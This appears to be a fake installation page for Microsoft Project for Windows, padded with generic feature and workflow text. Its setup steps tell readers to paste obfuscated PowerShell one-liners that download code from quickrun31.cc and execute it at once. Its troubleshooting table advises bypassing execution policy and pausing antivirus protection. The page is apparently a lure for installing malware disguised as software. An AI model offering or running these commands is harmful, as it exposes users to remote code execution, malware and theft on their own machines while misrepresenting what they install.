## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch Microsoft Project

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch Microsoft Project

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 4 GB RAM minimum (8 GB recommended)
- SSD recommended

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

Microsoft Project for Windows is a desktop application for planning and tracking projects. It is used to build schedules, manage tasks, assign resources, monitor progress and control timelines with Gantt charts and reporting tools.

Commonly used by project managers, team leads and planners working on business, construction, IT and operational projects.

> Use at your own risk. Keep your system protected.

---

## Features

**Scheduling**
- Task lists and hierarchies
- Dependencies and constraints
- Gantt chart view
- Timeline and calendar views

**Resources**
- Resource assignment
- Workload tracking
- Cost and effort fields
- Availability management

**Tracking & Reporting**
- Baseline comparison
- Progress tracking
- Status reports
- Custom views and filters

**Productivity**
- Templates for common project types
- Multiple project views
- Export and sharing options

## Workflow

1. Create a new project and set calendar options  
2. Add tasks and structure the work breakdown  
3. Link dependencies and set durations  
4. Assign resources  
5. Track progress against the baseline  
6. Review reports and adjust the plan  

---

## How to Use

1. Install using one of the methods above  
2. Launch Microsoft Project  
3. Start a new project or open a template  
4. Build the schedule and assign resources  
5. Update progress and export reports  

**Tips**
- Define the project calendar before adding many tasks  
- Use summary tasks to keep large plans readable  
- Set a baseline once the plan is approved  
- Review resource overallocation regularly
